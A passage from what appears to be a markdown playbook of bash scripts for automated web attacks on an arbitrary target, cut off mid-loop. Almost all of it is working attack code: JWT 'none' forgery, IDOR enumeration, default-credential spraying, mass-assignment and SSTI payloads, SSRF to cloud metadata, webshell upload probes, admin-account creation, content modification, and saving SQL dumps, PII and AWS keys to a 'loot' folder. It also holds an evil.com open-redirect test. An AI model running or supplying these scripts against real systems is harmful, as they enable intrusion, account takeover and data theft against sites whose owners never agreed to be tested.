  NONE_JWT=$(echo "$JWT" | cut -d. -f1 | python3 -c "import sys,json,base64; h=json.loads(base64.urlsafe_b64decode(sys.stdin.read()+'==').decode()); h['alg']='none'; print(base64.urlsafe_b64encode(json.dumps(h).encode()).decode().rstrip('='))" 2>/dev/null).$(echo "$JWT" | cut -d. -f2).$(echo "$JWT" | cut -d. -f3 | python3 -c "print('')")
  curl -s --max-time 5 -H "Authorization: Bearer $NONE_JWT" "$TARGET/api/user" | head -3
  curl -s --max-time 5 -H "Authorization: Bearer $NONE_JWT" "$TARGET/api/admin" | head -3
  curl -s --max-time 5 -H "Authorization: Bearer null" "$TARGET/api/user" | head -3

  # Check algorithm confusion RS256→HS256
  echo "  Algorithm confusion (RS256→HS256) checked — need JWT if RS256 detected"
else
  echo "No JWT found in initial scan"
fi

# ── Mass IDOR Testing ──
echo "--- Mass IDOR / Authorization Bypass ---"
declare -a IDOR_PATTERNS
IDOR_PATTERNS=(
  "/api/user/%s" "/api/v1/user/%s" "/api/users/%s" "/api/v1/users/%s"
  "/api/order/%s" "/api/orders/%s" "/api/v1/order/%s"
  "/api/profile/%s" "/api/account/%s" "/api/customer/%s"
  "/api/document/%s" "/api/invoice/%s" "/api/payment/%s"
  "/api/transaction/%s" "/api/booking/%s" "/api/reservation/%s"
  "/api/message/%s" "/api/ticket/%s" "/api/notification/%s"
  "/api/admin/user/%s" "/api/admin/order/%s"
  "/user/%s" "/admin/user/%s" "/profile/%s"
  "/user/%s/profile" "/user/%s/order" "/user/%s/payment"
)

IDS=(1 2 3 100 1001 1002 1003 2000 5000 9999 12345 54321 99999 111111 999999 1234567 9999999)

for pattern in "${IDOR_PATTERNS[@]}"; do
  for id in "${IDS[@]}"; do
    URL=$(printf "$pattern" "$id")
    STATUS=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" --max-time 3 "$TARGET$URL" 2>/dev/null)
    CODE="${STATUS%%:*}"
    SIZE="${STATUS##*:}"
    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && [ "$CODE" != "401" ] && [ "$SIZE" -gt 50 ] && \
      echo "[$CODE:$SIZE] $TARGET$URL"
  done
done

# ── API Rate Limit Testing ──
echo "--- Rate Limit Testing ---"
START=$(date +%s%N)
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} " --max-time 2 "$TARGET/api/" 2>/dev/null
done
END=$(date +%s%N)
DURATION=$(( (END - START) / 1000000 ))
echo ""
echo "50 requests in ${DURATION}ms — $(echo "scale=0; 50000/$DURATION" | bc 2>/dev/null) req/sec"
curl -s --max-time 5 -o /dev/null -w "After spray status: %{http_code}" "$TARGET/api/" 2>/dev/null
echo ""

# ── REST Parameter Pollution ──
echo "--- HTTP Parameter Pollution ---"
curl -s --max-time 5 "$TARGET/api/user?id=1&id=2&id=3&id=admin" 2>/dev/null | head -5
curl -s --max-time 5 "$TARGET/api/user?user_id=1&user_id=admin&user_id=../../etc/passwd" 2>/dev/null | head -5

echo "=== API EXPLOITATION DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 4: AUTHENTICATION ATTACKS
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 4: AUTHENTICATION ATTACKS"
echo "████████████████████████████████████████████████████"

# ── Login Endpoint Discovery ──
echo "--- Login Endpoints ---"
LOGIN_PATHS=("/login" "/admin" "/wp-login.php" "/administrator" "/user/login" "/api/auth/login" "/api/login" "/signin" "/sign-in" "/auth" "/oauth/authorize" "/saml/login" "/api/token" "/api/v1/token" "/token" "/auth/token" "/api/authenticate")
for path in "${LOGIN_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$TARGET$path" 2>/dev/null)
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "[$STATUS] $TARGET$path"
done

# ── Default Credentials ──
echo "--- Default Credential Spray ---"
# Common default creds
declare -a DEFAULT_CREDS
DEFAULT_CREDS=(
  "admin:admin" "admin:password" "admin:123456" "admin:admin123"
  "admin:password123" "admin:letmein" "admin:toor" "root:root"
  "root:toor" "root:admin" "administrator:administrator"
  "admin:passw0rd" "admin:P@ssw0rd" "admin:changeme"
  "user:user" "user:password" "user:123456"
  "guest:guest" "test:test" "test:123456"
  "demo:demo" "demo:demo123" "support:support"
  "admin:admin1234" "admin:admin2019" "admin:admin2020"
  "admin:admin2021" "admin:admin2022" "admin:admin2023" "admin:admin2024"
)

for creds in "${DEFAULT_CREDS[@]}"; do
  USER="${creds%%:*}"
  PASS="${creds##*:}"

  # Try JSON login
  for login_url in "$TARGET/api/auth/login" "$TARGET/api/login" "$TARGET/api/user/login"; do
    RESP=$(curl -s --max-time 5 -X POST \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$USER\",\"password\":\"$PASS\",\"email\":\"$USER\"}" \
      "$login_url" 2>/dev/null)
    if echo "$RESP" | grep -qiE '"token"|"access_token"|"jwt"|"success":true|"authenticated"|"session"'; then
      echo "🔴 [DEFAULT CREDS] $USER:$PASS works at $login_url"
      echo "[CREDS] $USER:$PASS @ $login_url" >> "$OUTDIR/loot/findings.txt"
      TOKEN=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token') or d.get('access_token') or d.get('jwt') or 'found')" 2>/dev/null)
      echo "  Token: ${TOKEN:0:50}..."
    fi
  done

  # Try form login
  curl -s --max-time 5 "$TARGET/wp-login.php" -o /dev/null -w "%{http_code}" | grep -qv '404' && \
    curl -s --max-time 5 -X POST -d "log=$USER&pwd=$PASS&wp-submit=Log+In" "$TARGET/wp-login.php" 2>/dev/null | grep -qiE 'wp-admin|dashboard' && \
    echo "🔴 [WP CREDS] $USER:$PASS works" && echo "[CREDS] WP $USER:$PASS" >> "$OUTDIR/loot/findings.txt"
done

# ── OAuth Misconfiguration ──
echo "--- OAuth Testing ---"
# Check OAuth callback URLs
curl -s --max-time 5 "$TARGET" 2>/dev/null | grep -oP 'oauth|callback|redirect_uri|client_id|response_type' | head -5
# CSRF check on OAuth
curl -sI --max-time 5 "$TARGET/oauth/authorize" 2>/dev/null | grep -iE 'state|nonce' | head -3

# ── Password Reset Abuse ──
echo "--- Password Reset Abuse ---"
curl -s --max-time 5 "$TARGET/password-reset" -o /dev/null -w "%{http_code}" | grep -qv '404' && \
  echo "[PASSWORD RESET] Endpoint found — test for host header injection & email enumeration"
curl -s --max-time 5 "$TARGET/api/auth/password-reset" -o /dev/null -w "%{http_code}" | grep -qv '404' && \
  echo "[PASSWORD RESET API] Attempt reset: " && \
  curl -s --max-time 5 -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com"}' "$TARGET/api/auth/password-reset" 2>/dev/null | head -3

echo "=== AUTH ATTACKS DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 5: FULL-CHAIN EXPLOITATION
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 5: FULL-CHAIN EXPLOITATION"
echo "████████████████████████████████████████████████████"

# ── Business Logic: Race Condition ──
echo "--- Race Condition Testing ---"
RACE_URL="$TARGET/api/coupon/redeem"

# Try parallel requests
for i in 1 2 3 4 5 6 7 8 9 10; do
  curl -s --max-time 5 -X POST \
    -H "Content-Type: application/json" \
    -d '{"coupon":"WELCOME50","code":"RACE'"$i"'"}' \
    "$RACE_URL" &
done
wait
echo "  Race condition test done — check for multiple accepted (coupon abuse)"

# ── Business Logic: Mass Assignment ──
echo "--- Mass Assignment Testing ---"
declare -a MASS_PAYLOADS
MASS_PAYLOADS=(
  '{"role":"admin","is_admin":true,"admin":true,"level":9999,"permissions":"*"}'
  '{"price":0,"amount":-1,"quantity":-1,"total":0,"discount":100,"balance":999999}'
  '{"is_verified":true,"email_verified":true,"email_confirmed":true,"status":"active"}'
  '{"bypass":true,"skip":true,"skip_validation":true,"validate":false}'
)

for payload in "${MASS_PAYLOADS[@]}"; do
  curl -s --max-time 5 -X POST -H "Content-Type: application/json" \
    -d "$payload" "$TARGET/api/user" 2>/dev/null | head -5
  curl -s --max-time 5 -X PUT -H "Content-Type: application/json" \
    -d "$payload" "$TARGET/api/user/1" 2>/dev/null | head -5
  curl -s --max-time 5 -X PATCH -H "Content-Type: application/json" \
    -d "$payload" "$TARGET/api/user/1" 2>/dev/null | head -5
done

# ── Business Logic: IDOR via UUID Prediction ──
echo "--- Sequential UUID / ID Prediction ---"
for i in 10000 10001 10002 11000 12000 20000; do
  curl -s -o /dev/null -w "%{http_code}:%{size_download} " --max-time 3 "$TARGET/api/transaction/$i"
  curl -s -o /dev/null -w "%{http_code}:%{size_download} " --max-time 3 "$TARGET/api/order/$i"
  curl -s -o /dev/null -w "%{http_code}:%{size_download} " --max-time 3 "$TARGET/api/invoice/$i"
done
echo ""

# ── SSRF Testing ──
echo "--- SSRF Testing ---"
SSRF_PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/user-data/"
  "http://metadata.google.internal/"
  "http://100.100.100.200/latest/meta-data/"
  "http://127.0.0.1:6379"
  "http://127.0.0.1:9200"
  "http://127.0.0.1:3306"
  "http://localhost:22"
  "file:///etc/passwd"
  "dict://localhost:6379/"
)
for ssrf in "${SSRF_PAYLOADS[@]}"; do
  ENC_SSRF=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$ssrf'))" 2>/dev/null)
  RESP=$(curl -s --max-time 5 "$TARGET?url=$ENC_SSRF&redirect=$ENC_SSRF&page=$ENC_SSRF&dest=$ENC_SSRF&callback=$ENC_SSRF&image=$ENC_SSRF&file=$ENC_SSRF&path=$ENC_SSRF" 2>/dev/null)
  if echo "$RESP" | grep -qiE 'ami-id|instance-id|meta-data|computeMetadata|redis|NoSQL|uptime|root:' 2>/dev/null; then
    echo "🔴 [SSRF DETECTED] $ssrf"
    echo "[SSRF] $ssrf" >> "$OUTDIR/loot/findings.txt"
    echo "$RESP" | head -5
  fi
done

# ── SSTI Deep ──
echo "--- SSTI Deep ---"
SSTI_DEEP=(
  "{{7*7}}" "{{config}}" "{{self.__class__.__mro__[2].__subclasses__()}}"
  "#{7*7}" "*{7*7}" "${{7*7}}" "${7*7}"
  "<%= 7*7 %>" "{{7*'7'}}" "{{''.__class__.__bases__[0].__subclasses__}}"
  "{{'a'.upper()}}" "{{'77'.__class__}}"
  "{php}echo 77;{/php}" "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
)
SSTI_PARAMS=("name" "user" "template" "view" "page" "lang" "username" "search" "q" "input" "message" "text" "subject")
for payload in "${SSTI_DEEP[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
  QUERY=""
  for param in "${SSTI_PARAMS[@]}"; do
    QUERY+="$param=$ENC&"
  done
  BODY=$(curl -s --max-time 5 "$TARGET?${QUERY}" 2>/dev/null)
  if echo "$BODY" | grep -qF "49" || echo "$BODY" | grep -qF "7777" || echo "$BODY" | grep -qF "77" || echo "$BODY" | grep -qF "Config" || echo "$BODY" | grep -qF '__class__'; then
    echo "🔴 [SSTI DETECTED] Payload reflected: $payload"
    echo "[SSTI] $payload" >> "$OUTDIR/loot/findings.txt"
    break
  fi
done

# ── CSRF Testing ──
echo "--- CSRF Testing ---"
curl -sI "$TARGET" 2>/dev/null | grep -qiE 'csrf-token|x-csrf-token|x-xsrf-token' && echo "  ✅ CSRF token found in headers" || echo "  ⚠️  No CSRF header found"
curl -s "$TARGET" 2>/dev/null | grep -iE 'csrf_token|_token|_csrf_token|authenticity_token|csrf' | head -3

# ── WebSocket Testing ──
echo "--- WebSocket Endpoints ---"
curl -s "$TARGET" 2>/dev/null | grep -oP 'wss?://[^"'"'"'\s]+' | sort -u | head -10

echo "=== FULL-CHAIN EXPLOITATION DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 5B: DATA EXFILTRATION & PERSISTENCE SIMULATION
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 5B: DATA EXFILTRATION & PERSISTENCE"
echo "████████████████████████████████████████████████████"

# ── What Data Can We Access? ──
echo "--- Data Accessibility Assessment ---"
declare -a DATA_ENDPOINTS
DATA_ENDPOINTS=(
  "/api/users" "/api/v1/users" "/api/user" "/api/customers" "/api/clients"
  "/api/orders" "/api/v1/orders" "/api/transactions" "/api/payments"
  "/api/products" "/api/inventory" "/api/pricing"
  "/api/documents" "/api/files" "/api/uploads"
  "/api/logs" "/api/audit" "/api/activity"
  "/api/admin/users" "/api/admin/settings" "/api/admin/config"
  "/api/reports" "/api/analytics" "/api/exports"
  "/api/database" "/api/backup" "/api/migration"
  "/users.csv" "/customers.csv" "/orders.csv" "/products.csv"
  "/export" "/download" "/backup.sql" "/data.json"
)

echo "--- Potential Data Leaks ---"
for ep in "${DATA_ENDPOINTS[@]}"; do
  RESP=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}:%{size_download}" "$TARGET$ep" 2>/dev/null)
  STATUS="${RESP%%:*}"
  SIZE="${RESP##*:}"
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && [ "$SIZE" -gt 100 ]; then
    CONTENT_TYPE=$(curl -sI --max-time 3 "$TARGET$ep" 2>/dev/null | grep -i 'content-type' | head -1)
    echo "[$STATUS] $TARGET$ep — $SIZE bytes — $CONTENT_TYPE"

    # Try to download and categorize
    DATA=$(curl -s --max-time 10 "$TARGET$ep" 2>/dev/null | head -200)
    if echo "$DATA" | grep -qiE '"email"|"password"|"ssn"|"credit_card"|"phone"|"address"'; then
      echo "  🔴 [PII EXPOSED] Personal data accessible at $ep"
      echo "[DATA EXFIL] PII accessible at $ep" >> "$OUTDIR/loot/findings.txt"
    fi
    if echo "$DATA" | grep -qiE '"total"|"amount"|"price"|"revenue"|"commission"'; then
      echo "  🔴 [FINANCIAL DATA] Financial records accessible at $ep"
      echo "[DATA EXFIL] Financial data at $ep" >> "$OUTDIR/loot/findings.txt"
    fi
    if echo "$DATA" | grep -qiE '"password_hash"|"password"|"hash"|"salt"'; then
      echo "  🔴 [CREDENTIAL DUMP] Password hashes accessible at $ep"
      echo "[DATA EXFIL] Credential dump at $ep" >> "$OUTDIR/loot/findings.txt"
    fi
  fi
done

# ── Database Dump Simulation ──
echo "--- Database Exposure ---"
for db_path in "/database.sql" "/db.sql" "/backup.sql" "/dump.sql" "/data.sql" "/mysqldump.sql" "/pgdump.sql" "/export.sql" "/sql/dump.sql" "/db/export" "/api/db/export" "/admin/db/backup"; do
  DATA=$(curl -s --max-time 10 "$TARGET$db_path" 2>/dev/null | head -500)
  if echo "$DATA" | grep -qiE 'CREATE TABLE|INSERT INTO|DROP TABLE|-- Dump|Structure.*table|Database:'; then
    SIZE=$(echo "$DATA" | wc -c)
    echo "🔴 [DATABASE DUMP] $TARGET$db_path ($SIZE bytes) — full SQL dump accessible!"
    echo "$DATA" > "$OUTDIR/loot/database-dump.sql" 2>/dev/null
    echo "[DATA EXFIL] Full SQL dump at $db_path" >> "$OUTDIR/loot/findings.txt"

    # Extract table names
    echo "$DATA" | grep -oP 'CREATE TABLE `?\K[^` (]+' | sort -u | head -20
    # Extract any passwords/credentials in dump
    echo "$DATA" | grep -iE "password_hash|password|hash|salt|secret|token|api_key" | head -10
    break
  fi
done

# ── File Upload / Webshell Simulation ──
echo "--- File Upload & Webshell Vectors ---"
UPLOAD_ENDPOINTS=(
  "/api/upload" "/api/v1/upload" "/api/files" "/upload" "/uploads/"
  "/wp-content/uploads/" "/admin/upload" "/api/import" "/api/media"
  "/api/avatar" "/api/profile/upload" "/api/file"
)

for ep in "${UPLOAD_ENDPOINTS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$TARGET$ep" 2>/dev/null)
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "[$STATUS] $TARGET$ep"
done

# Test PHP upload (if any upload found)
for ep in "${UPLOAD_ENDPOINTS[@]}"; do
  UPLOAD_TEST=$(curl -s --max-time 5 -X POST \
    -F "file=@/dev/null;filename=test.php;type=application/x-php" \
    -F "file=@/dev/null;filename=shell.phtml;type=image/jpeg" \
    "$TARGET$ep" 2>/dev/null)
  if echo "$UPLOAD_TEST" | grep -qiE '"url"|"path"|"filename"|"success":true'; then
    echo "🔴 [FILE UPLOAD] $TARGET$ep accepts file upload — test PHP/webshell upload"
    echo "[PERSISTENCE] File upload available at $ep — potential webshell" >> "$OUTDIR/loot/findings.txt"
    echo "$UPLOAD_TEST" | head -10
  fi
done

# ── Admin Account Creation Simulation ──
echo "--- Privilege Escalation / Admin Creation ---"
declare -a ADMIN_ENDPOINTS
ADMIN_ENDPOINTS=(
  "/api/admin/user" "/api/admin/users" "/api/admin/create"
  "/api/v1/admin/user" "/api/register" "/api/signup" "/api/user/create"
  "/api/user/register" "/account/create" "/api/account"
)

for ep in "${ADMIN_ENDPOINTS[@]}"; do
  # Try creating a user with admin role
  for role_field in "role" "user_role" "type" "user_type" "account_type" "permissions" "level" "is_admin"; do
    for role_value in "admin" "administrator" "superadmin" "root" "super_user" "owner"; do
      CREATE_RESP=$(curl -s --max-time 5 -X POST \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"pentest_$(date +%s)\",\"password\":\"P3nt3st123!\",\"email\":\"pentest_$(date +%s)@test.com\",\"$role_field\":\"$role_value\"}" \
        "$TARGET$ep" 2>/dev/null)
      if echo "$CREATE_RESP" | grep -qiE '"id"|"user_id"|"token"|"success":true|"created"'; then
        echo "🔴 [ADMIN CREATION] $TARGET$ep — user created with $role_field=$role_value"
        echo "[PERSISTENCE] Admin user creation via $ep ($role_field=$role_value)" >> "$OUTDIR/loot/findings.txt"
        echo "$CREATE_RESP" | head -5
        break 3
      fi
    done
  fi
done

# ── Content Manipulation / Defacement ──
echo "--- Content Manipulation Vectors ---"
# Check if we can modify content
for modify_ep in "/api/page" "/api/content" "/api/post" "/api/article" "/api/settings" "/api/config" "/api/menu" "/api/homepage"; do
  MOD_RESP=$(curl -s --max-time 5 -X PUT \
    -H "Content-Type: application/json" \
    -d '{"title":"pentest_security_check","content":"<script>security_test</script>"}' \
    "$TARGET$modify_ep/1" 2>/dev/null)
  if echo "$MOD_RESP" | grep -qiE '"updated"|"success":true|"modified"|"saved"'; then
    echo "🔴 [CONTENT MODIFICATION] $TARGET$modify_ep — content can be modified"
    echo "[REPUTATION] Content modification possible at $modify_ep — defacement vector" >> "$OUTDIR/loot/findings.txt"
  fi
done

# ── Session / Token Hijacking Vector ──
echo "--- Session Security ---"
# Check cookie attributes
curl -sI "$TARGET" 2>/dev/null | grep -i 'set-cookie' | while read -r cookie; do
  echo "Cookie: $cookie"
  echo "$cookie" | grep -qi 'httponly' || echo "  ❌ HttpOnly MISSING — XSS can steal this cookie"
  echo "$cookie" | grep -qi 'secure' || echo "  ❌ Secure MISSING — cookie sent over HTTP"
  echo "$cookie" | grep -qi 'samesite' || echo "  ❌ SameSite MISSING — CSRF vector"
done

# ── Data Exfiltration Simulation Summary ──
echo ""
echo "--- DATA EXFILTRATION SUMMARY ---"
echo "Direct database dumps: $(grep -c 'DATABASE DUMP' "$OUTDIR/loot/findings.txt" 2>/dev/null || echo 0)"
echo "PII exposures: $(grep -c 'PII' "$OUTDIR/loot/findings.txt" 2>/dev/null || echo 0)"
echo "Financial data leaks: $(grep -c 'FINANCIAL' "$OUTDIR/loot/findings.txt" 2>/dev/null || echo 0)"
echo "Admin creation vectors: $(grep -c 'ADMIN CREATION' "$OUTDIR/loot/findings.txt" 2>/dev/null || echo 0)"
echo "File upload vectors: $(grep -c 'FILE UPLOAD' "$OUTDIR/loot/findings.txt" 2>/dev/null || echo 0)"
echo ""
echo "🔴 If any of these exist, a REAL ATTACKER would have:"
echo "   1. Downloaded customer PII for identity theft"
echo "   2. Dumped database for credential cracking"
echo "   3. Uploaded webshell for persistent access"
echo "   4. Created admin account for long-term persistence"
echo "   5. Modified content for reputation damage / defacement"

echo "=== DATA EXFILTRATION & PERSISTENCE DONE ==="
```

---

### ════════════════════════════════════════════════════════
###  PHASE 5C: PROVIDER INTEGRATION SECURITY
### ════════════════════════════════════════════════════════

```bash
TARGET="$ARGUMENTS"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
BASE=$(echo "$DOMAIN" | sed 's|^www\.||')

# === GITEST: Hybrid SCAN_DIR resolution ===
if [ -n "$GITEST_SCAN_DIR" ]; then
  SCAN_BASE="$GITEST_SCAN_DIR"
elif [ -d "$HOME/SCAN" ]; then
  SCAN_BASE="$HOME/SCAN"
else
  SCAN_BASE="$(pwd)/SCAN"
fi
OUTDIR="$SCAN_BASE/targets/$BASE"
mkdir -p "$OUTDIR"/{recon,loot,exploits,reports,screenshots,payloads}

echo "████████████████████████████████████████████████████"
echo "  PHASE 5C: PROVIDER INTEGRATION SECURITY"
echo "████████████████████████████████████████████████████"

HOMEPAGE=$(curl -s --max-time 15 "$TARGET" 2>/dev/null)
ALL_JS=$(cat "$OUTDIR/recon/all-js-files.txt" 2>/dev/null || echo "")
ALL_PAGES=$(cat "$OUTDIR/recon/all-pages.txt" 2>/dev/null || echo "$TARGET")

# ── SSO / OAuth Provider Detection ──
echo "--- SSO & OAuth Provider Detection ---"
SSO_PROVIDERS=("google.com/o/oauth2" "facebook.com/dialog/oauth" "appleid.apple.com" "login.microsoftonline.com" "accounts.google.com" "auth0.com" "okta.com" "onelogin.com" "saml" "oauth" "openid" "sso" "login.gov" "github.com/login/oauth" "twitter.com/i/oauth" "linkedin.com/oauth" "amazon.com/ap/oa")

for page in $ALL_PAGES; do
  PC=$(curl -s --max-time 5 "$page" 2>/dev/null)
  for provider in "${SSO_PROVIDERS[@]}"; do
    if echo "$PC" | grep -qi "$provider"; then
      echo "  [SSO] $provider detected on $page"
      echo "$provider" >> "$OUTDIR/loot/sso-providers.txt" 2>/dev/null
    fi
  done
done 2>/dev/null

# ── Auth Flow Testing (OAuth misconfig) ──
echo "--- OAuth Misconfiguration Tests ---"
# Check for OAuth callback URLs
echo "$HOMEPAGE" | grep -oP 'redirect_uri[^&"\s]+|callback[^&"\s]+|state[^&"\s]+' | head -10 > "$OUTDIR/loot/oauth-params.txt"
[ -s "$OUTDIR/loot/oauth-params.txt" ] && echo "OAuth params found" && cat "$OUTDIR/loot/oauth-params.txt"

# Test CSRF in OAuth (state parameter)
if grep -qi "redirect_uri" "$OUTDIR/loot/oauth-params.txt" 2>/dev/null; then
  echo "  ⚠️  Open redirect via OAuth redirect_uri — test with /?redirect_uri=https://evil.com"
  echo "[PROVIDER] OAuth redirect_uri — potential open redirect" >> "$OUTDIR/loot/findings.txt"
fi
grep -qi "state" "$OUTDIR/loot/oauth-params.txt" 2>/dev/null || \
  echo "  ❌ OAuth state parameter missing — CSRF on OAuth flow" && \
  echo "[PROVIDER] OAuth missing state — CSRF" >> "$OUTDIR/loot/findings.txt"

# ── Webhook Security Testing ──
echo "--- Webhook Security ---"
# Find webhook endpoints
WEBHOOK_PATHS=(
  "/webhook" "/webhooks" "/api/webhook" "/api/v1/webhook" "/hooks"
  "/api/hook" "/api/callback" "/callback" "/api/webhook/receive"
  "/stripe/webhook" "/payment/webhook" "/api/payment/webhook"
)
for path in "${WEBHOOK_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$TARGET$path" 2>/dev/null)
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "[$STATUS] $TARGET$path"
done

# Test webhook signature validation
for wh in /webhook /api/webhook /stripe/webhook; do
  # Send request WITHOUT signature
  NO_SIG=$(curl -s --max-time 5 -X POST \
    -H "Content-Type: application/json" \
    -d '{"test":true,"event":"test_webhook","data":{"key":"value"}}' \
    "$TARGET$wh" 2>/dev/null)
  if echo "$NO_SIG" | grep -qiE '"ok"|"received"|200|"success"|"processed"'; then
    echo "🔴 [WEBHOOK] $TARGET$wh — accepts requests WITHOUT signature verification!"
    echo "[PROVIDER] Webhook $wh without signature verification" >> "$OUTDIR/loot/findings.txt"
    echo "  Response: $NO_SIG" | head -3
  fi
done

# ── API Key / Provider Key Exposure ──
echo "--- Provider API Key Exposure ---"
# Search all JS files for API keys
for js_file in $(echo "$ALL_JS"); do
  JS_URL="$js_file"
  [[ "$JS_URL" != http* ]] && JS_URL="$TARGET$JS_URL"
  JS_DATA=$(curl -s --max-time 5 "$JS_URL" 2>/dev/null)

  # Stripe keys
  echo "$JS_DATA" | grep -oP 'pk_live_[A-Za-z0-9]+|pk_test_[A-Za-z0-9]+' | head -5 | while read -r key; do
    echo "🔴 [API KEY] Stripe publishable key in $JS_URL: $key"
    echo "[PROVIDER] Stripe key exposed: $key" >> "$OUTDIR/loot/findings.txt"
  done

  # Firebase keys
  echo "$JS_DATA" | grep -oP 'AIzaSy[A-Za-z0-9_-]+' | head -5 | while read -r key; do
    echo "  ⚠️  Firebase API key: $key"
  done

  # AWS keys
  echo "$JS_DATA" | grep -oP 'AKIA[A-Z0-9]{16}' | head -5 | while read -r key; do
    echo "🔴 [API KEY] AWS Access Key in $JS_URL: $key"
    echo "[PROVIDER] AWS key exposed: $key" >> "$OUTDIR/loot/findings.txt"
  done

  # Generic API keys
  echo "$JS_DATA" | grep -oP '(?:api[Kk]ey|apikey|api_key|secret|token)[=:]["'"'"'][A-Za-z0-9_\-\.]{10,60}' | head -10 | while read -r match; do
    echo "  ⚠️  Potential key: $match"
  done
done 2>/dev/null

# ── Third-Party API Endpoint Exposure ──
echo "--- Provider API Integration Testing ---"
# Look for partner/provider URLs in JS
for js_file in $(echo "$ALL_JS"); do
  JS_URL="$js_file"
  [[ "$JS_URL" != http* ]] && JS_URL="$TARGET$JS_URL"
  JS_DATA=$(curl -s --max-time 5 "$JS_URL" 2>/dev/null)
  # Find external API calls
  echo "$JS_DATA" | grep -oP 'https?://api\.[^"'"'"'\s]+|https?://[a-z]+\.com/api/[^"'"'"'\s]+|https?://[^"'"'"'\s]*provider[^"'"'"'\s]*|https?://[^"'"'"'\s]*partner[^"'"'"'\s]*' | sort -u | head -20
done 2>/dev/null > "$OUTDIR/loot/provider-api-calls.txt"
[ -s "$OUTDIR/loot/provider-api-calls.txt" ] && echo "Provider API calls found: $(wc -l < "$OUTDIR/loot/provider-api-calls.txt")"

# ── Webhook/Provider Data Leak Testing ──
echo "--- Provider Data Exposure ---"
# Check if webhook logs/events are exposed
for wl_path in "/webhook/logs" "/webhooks/log" "/api/webhook/history" "/webhook/events" "/stripe/webhook/events" "/api/events" "/api/activity/webhook"; do
  DATA=$(curl -s --max-time 5 "$TARGET$wl_path" 2>/dev/null | head -100)
  if echo "$DATA" | grep -qiE '"event"|"webhook"|"stripe"|"payment"|"charge"|"customer"|"data"'; then
    echo "🔴 [PROVIDER DATA] $TARGET$wl_path — webhook event history exposed (contains customer/payment data)"
    echo "[PROVIDER] Webhook event history exposed at $wl_path" >> "$OUTDIR/loot/findings.txt"
    echo "$DATA" | head -10
  fi
done

# ── Provider Dashboard / Admin Portal Discovery ──
echo "--- Provider/Partner Portal Discovery ---"
for portal in "/partner" "/partners" "/provider" "/providers" "/vendor" "/vendors" "/affiliate" "/affiliates" "/api/partner" "/portal" "/dashboard/partner" "/partner/dashboard"; do
  RESP=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "$TARGET$portal" 2>/dev/null)
  [ "$RESP" != "404" ] && [ "$RESP" != "000" ] && [ "$RESP" != "302" ] && echo "[$RESP] $TARGET$portal"
done

# ── Webhook Spoofing / Replay Attack ──
echo "--- Webhook Replay/Spoofing Risk ---"
for wh_path in "${WEBHOOK_PATHS[@]}"; do
  ST=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$TARGET$wh_path" 2>/dev/null)
  if [ "$ST" = "200" ] || [ "$ST" = "201" ] || [ "$ST" = "202" ]; then
